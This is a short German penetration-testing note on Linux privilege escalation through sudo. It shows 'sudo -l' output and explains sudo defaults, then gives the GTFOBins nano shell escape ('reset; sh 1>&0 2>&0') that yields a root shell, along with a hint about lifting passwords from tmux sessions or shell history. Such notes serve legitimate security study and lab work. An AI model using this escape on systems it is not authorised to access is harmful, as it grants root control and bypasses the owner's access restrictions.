---
tags: [technique, privesc, linux]
aliases: [sudo -l, GTFOBins]
---
# Sudo Abuse

> `sudo -l` zeigt, welche Befehle ein User als root (oder anderer User) ausführen darf. Erlaubte Binaries, die eine **Shell-Escape** können, führen direkt zu root → [GTFOBins](https://gtfobins.github.io/).

## Rechte prüfen
```bash
sudo -l
```
```
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, ...

User sadm may run the following commands:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
```

## Wichtige Defaults
| Eintrag                | Bedeutung                                                                 |
| ---------------------- | ------------------------------------------------------------------------- |
| `NOPASSWD`             | Befehl ohne Passwort ausführbar                                           |
| `PASSWD`               | Passwort nötig (→ evtl. aus [[tmux Hijacking]] / Historie holen)          |
| `timestamp_timeout=-1` | einmal `sudo` authentifiziert → **bleibt gültig** (kein erneutes PW nötig) |

## GTFOBins: nano als Root-Shell
Ist `nano` per `sudo` erlaubt, aus dem Editor heraus einen Befehl als root starten:
```
sudo nano /etc/firewall.sh

Strg+R        (Read File)
Strg+X        (wechselt zu "Execute Command")
reset; sh 1>&0 2>&0
```
| Teil         | Bedeutung                                                      |
| ------------ | -------------------------------------------------------------- |
| `reset`      | Terminal in Normalzustand zurücksetzen                         |
| `sh`         | Shell starten (nano läuft als root → Shell ist root)           |
| `1>&0 2>&0`  | stdout(1) + stderr(2) auf stdin(0) = Terminal umleiten          |

=> Root-Shell. Siehe auch Datei-Deskriptoren in [[Reverse Shell]].

> [!tip] Weitere Binaries
> Jedes per `sudo` erlaubte Programm gegen [GTFOBins](https://gtfobins.github.io/) prüfen (`vi`, `less`, `tail`, `find`, `awk`, …) – viele haben einen Shell-Escape.

Verwandt: [[SUID Abuse]] (gleiche Idee, aber über SUID-Bit statt sudo).
